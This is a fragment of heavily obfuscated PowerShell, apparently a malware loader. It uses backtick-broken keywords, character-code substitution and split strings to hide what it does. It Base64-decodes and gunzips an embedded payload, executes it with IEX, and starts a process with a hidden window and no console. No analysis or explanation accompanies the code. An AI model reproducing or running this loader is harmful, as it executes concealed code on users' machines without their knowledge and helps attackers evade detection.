')."Re`P`LaCe"(([CHaR]97+[CHaR]105+[CHaR]87),[sTrING][CHaR]36)+(('IO.MemoryStre'+'am(,'+'[Conve'+'rt]::FromBase64String(dZ3dZ3H4sIAL4MgFgCA71WbW/aSBD+nEr9'+'D1aFhK0Sb'+'F6aNJEq3R'+'pjXgIJxMEEOFQt9tosLF'+'5qr5OYXv'+'/7jcFu'+'6LU55e6ks0De3XnZ2We'+'e2bEXB46gPJCSq81ZUzP7Penr2zcnAxzijSQXVl67JBU2VO/ddxfthXJyAs'+'LCY0I/7+goIdInSZ6h7dbgG0yD+eVlIw5DEojDvNwiAkUR2SwYJZGsSH9I4yU'+'JyenN'+'YkUcIX2VCp/LLcYXmGVqSQM7SyKdosBNZT3u4DS4srVlVMjF338vKrPTyrzc/BJjFslFK4kE2ZRdxoqK9E1JN7xLtkQu9qk'+'T8oh7ojymQa1aHgUR9sg1eHsgfSKW3I2KChwFfiERcR'+'hIz4dKvRx05C'+'IMBy'+'F3k'+'OuGJAKTcid44GsiF4KYsZL0mzzLQriNA0E3BOSChHxrkfCBOiQqt3HgMnJ'+'LvLl8TR7zk7/WSD42Aq2BCJUSpOWlWPvcjRk5mBeVn6NN86nA80NOAYdvb9+8fePlVKAt97w6qR8TA'+'UYns/2YQKjygE'+'d0r/pJ0kpSH/bDgocJTAt3YUyUuTRL8zCbz6UCZlZ1vVknWtcoveymktuAxTq+i'+'MyIfIblmc'+'2pOwezLFkFn9bw6IbXbmteKn6ZewbxaECMJMAb6'+'uT0kn+VBOIxsj'+'94OVe7hvjkYiYgrkEY8bFIES1Js5/NmhsqvtvqMWUuCZEDiYwgKsix8mMwhyTJxU7QJxtA7TAvQk48IDXJtTMiJ/nu6RyUig2Go6gkDWKoKqckWQQz4pYkFEQ0E6FY8P2w+BxuP2aCOjgSubu58hc4s20bPIhEG'+'DuQT4DgztoSh2KWIlKS2tQlemJRP9+++Es8GpgxG'+'vjg6QHyASs'+'pDpZI'+'WRJ'+'CpMeMUMoWEZ3NlpEN'+'qO6L3WTYh9LOamPPLuwTt/hCvDn7D1RPAcqROYoWsm4xLkqSTUM'+'BV0cKds6y/xTQ0f1x'+'HFojJF'+'nG5Ly6Znoi0oIohGiXMjeDbQ9SKAAgM+QbHUfkrG6'+'JEOCT36k3tIHgmXQC1nf0Na2gR1rp9OE/orUON87dq+6q'+'rYbG09JDnajTbw+MYbtdf+'+'hadl1YzY64GnREv3m/WlmofTuaiGkHte+otp7Ud9su3Vk95E6e1LOdvnvU9Kfdyne9ieF5/rln3VY+mLQ3bgx1rYp7Rj'+'PujfVH'+'XatHTfrYHtLRcN01xWJiMzzyVP++coHpUy9c2RXe33UQai1rzq7r2a1l300mbfViXF+jJkKNoGmbOr+a6CEaqD'+'b2bT6uJw9nY7+BdNOhZDocmfpwaOpo1Fp9MS5UH2zv8VIf21U'+'63d7fLmFuQghXqlbvuGTHJ0MAqcUR9m9Bx29UnaUHOsZ7pL+/5lEVr3WOdNAx'+'p18grsnWHD'+'CQ342qHNns+h6j3jQxVbUyGdRRW6Pjlo9Sl9jXhxhFD8bOUCu2y93xh+uJp9'+'r37Fw1Gndbx1NV9bFtXDnTytPHm/OPvTG1NxyNVNV+l7ID6'+'FHAbW86DBdHKX/p1u'+'/jMFpiBlSAmzwvU5OHZnYvDzhNLWT5uVWvSRgQBv0NOmDObcQYd9IukV/j0KQOrWMO1TqCYa36y5EifVdU'+'n'+'n'+'tHvnR5O'+'YVooViAv+UeCXyxLGlPNU2DBqA91TU47+sP2ODbRE49ldL+kWOUOWd750paNIVttKho/wN2WcEu4eW+Arvntb+RvgpPrfT'+'99D9Jflz4RwD/OxTGmApQt+D2Y'+'eTQJV8EI+PM0UfGPlfACS970'+'u+'+'9m1icXsPHx5/2cg3LZwoAAA==dZ3dZ3));IEX'+' ')-CRePLAce([ChAR]100+[ChAR]90+[ChAR]51),[ChAR]39)+'(N'+'ew-Object'+' '+'IO.'+'St'+'re'+'am'+'Read'+'er(New-'+'Object '+('I'+'O.Co'+'m'+'pr'+'ess'+'i'+'o'+'n.'+'GzipSt'+'re'+'am({0'+'}s,[IO.Compres'+'s'+'i'+'o'+'n.'+'C'+'ompr'+'essi'+'onM'+'o'+'de]::Decompress)))'+'.Re'+'adToEnd();') -f [ChAR]36);${s}."us`eSHELle`xE`cUTE"=${FAl`SE};${s}."R`e`dIrE`cts`TANDArD`OUT`pUt"=${tR`UE};${S}."window`St`yLE"=("{0}{1}" -f'H','idden');${S}."CrEat`e`N`OWI`Ndow"=${tR`Ue};${p}=  (GET-VAriAbLe ("L"+"3Rs")  -ValUEONLY)::("{1}{0}"-f 'art','St').Invoke(${S});
